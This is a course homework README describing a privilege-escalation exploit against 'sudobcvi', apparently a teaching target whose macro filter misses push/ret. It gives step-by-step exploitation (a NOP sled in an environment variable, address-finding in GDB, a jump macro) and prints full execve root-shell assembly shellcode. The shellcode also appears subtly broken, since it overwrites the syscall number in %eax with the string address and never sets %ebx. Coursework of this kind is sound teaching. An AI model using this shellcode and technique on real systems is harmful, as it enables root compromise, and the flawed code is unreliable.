README - CSCI 5271
HA 1 Exploit #3

GROUP MEMBERS
Zach Larsen - larse702@umn.edu
Jon Huhn    - huhnx025@umn.edu

VULNERABILITY
The vulnerability we discovered pertained to BCVI too lightly restricting 
commands allowed in macros. BCVI already does restrict obviously dangerous
commands like call, jmp, and int, but not enough to be fully secure. With 
a simple push and ret command, an adversary can transfer control of the 
program to any arbitrary address in memory.


STEP-BY-STEP
First, we wrote shellcode that performed 'execve("/bin/rootshell", NULL, NULL)'
and placed that in an environment variable, padded by an 8kb no-op sled. Next, 
we determined the approximate address of our shellcode with GDB. Then, we wrote 
a macro that would push this approximate address onto the stack and return, 
effectively jumping to that address. To execute the macro, we opened a file 
containing the macro in sudobcvi, then executed it with the 'R' command. Once 
our shellcode executed, we obtained a rootshell. Copies of our shellcode and 
macro are below.

SHELLCODE
shellcode:
	push	%ebp
	movl	%esp,%ebp

	# Push a string representing "/bin/rootshell" onto the stack
	push	$0x20206c6c
	push	$0x65687374
	push	$0x6f6f722f
	push	$0x6e69622f

	# Put a null-terminator onto the end of the string
	xorl	%ecx, %ecx
	movb 	%cl, -2(%ebp)

	# Load the execve system call into %eax
	xorl	%eax, %eax
	movb	$11, %al

	# Load the string as the first argument
	leal	-16(%ebp), %eax

	# Set the second and third arguments to NULL
	xorl	%ecx, %ecx
	xorl	%edx, %edx

	# Perform the execve system call
	int	$0x80

loop: jmp loop

MACRO
my_jmp:
	# Approximate address of our shellcode
	push $0xffffc0ff
	ret

